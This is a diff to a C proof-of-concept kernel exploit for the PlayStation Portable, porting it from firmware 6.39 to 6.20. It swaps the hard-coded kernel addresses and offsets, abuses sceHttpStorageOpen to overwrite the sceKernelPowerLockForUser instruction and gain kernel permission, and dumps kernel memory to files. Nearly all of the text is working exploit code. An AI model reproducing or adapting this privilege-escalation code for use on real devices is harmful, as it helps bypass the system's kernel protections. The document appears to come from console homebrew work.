@@ -11,7 +11,8 @@
 #include <psppower.h>
 #include <string.h>
 
-PSP_MODULE_INFO("639kxploit", PSP_MODULE_USER, 1, 0);
+PSP_MODULE_INFO("620kxploit", PSP_MODULE_USER, 1, 0);
+//PSP_MODULE_INFO("639kxploit", PSP_MODULE_USER, 1, 0);
 
 /**
  * PSP_THREAD_ATTR_VFPU is mandatory by this exploit
@@ -78,7 +79,8 @@ void sync_cache(void)
 /** Recovery the instruction we smashed */
 void recovery_sysmem(void)
 {
-	_sw(0x3C058801, 0x8800CC34); // lui $a1, 0x8801
+	//_sw(0x3C058801, 0x8800CC34); // lui $a1, 0x8801 for 6.39
+	_sw(0x3C058801, 0x8800CCBC);	// lui $a1, 0x8801 for 6.20
 }
 
 int is_exploited = 0;
@@ -131,7 +133,8 @@ void do_exploit(void)
 	 * Write vsync 0xFFFF(0xFFFFFFFF) to the first instruction of sceKernelPowerLockForUser
 	 * Now the gate to kernel is opened :)
 	 */
-	ret = sceHttpStorageOpen((0x8800CC34>>2), 0, 0); // scePowerLock override
+	//ret = sceHttpStorageOpen((0x8800CC34>>2), 0, 0); // scePowerLock override for 6.39
+	ret = sceHttpStorageOpen((0x8800CCBC >> 2), 0, 0); // scePowerLock override for 6.20
 	printk("sceHttpStorageOpen#2 -> 0x%08X\n", ret);
 	sync_cache();
 
@@ -139,7 +142,10 @@ void do_exploit(void)
 	interrupts = pspSdkDisableInterrupts();
 	kernel_entry = (u32) &kernel_permission_call;
 	entry_addr = ((u32) &kernel_entry) - 16;
-	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
+	/* 0x000040F4 is sceKernelPowerLockForUser data offset for 6.39 */
+	//sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
+	/* 0x00004234 is sceKernelPowerLockForUser data offset for 6.20 */
+	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x00004234);
 	pspSdkEnableInterrupts(interrupts);
 
 	/* Unload network libraries */
@@ -172,6 +178,7 @@ void dump_kmem()
 int main(int argc, char * argv[])
 {
 	pspDebugScreenInit();
+	printk("6.20 kxploit POC by SmikY\n");
 	printk("6.39 kxploit POC by liquidzigong\n");
 	printk("originally found by some1\n");
 	printk("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\n\n");
@@ -185,6 +192,13 @@ int main(int argc, char * argv[])
 		printk("Exploit failed...\n");
 	}
 
+	while (1) {
+		SceCtrlData pad;
+		sceCtrlReadBufferPositive(&pad, 1);
+		if (pad.Buttons & PSP_CTRL_CROSS)
+			break;
+		sceKernelDelayThread(10000);
+	}
 	printk("Exiting...\n");
 
 	sceKernelDelayThread(1000000);
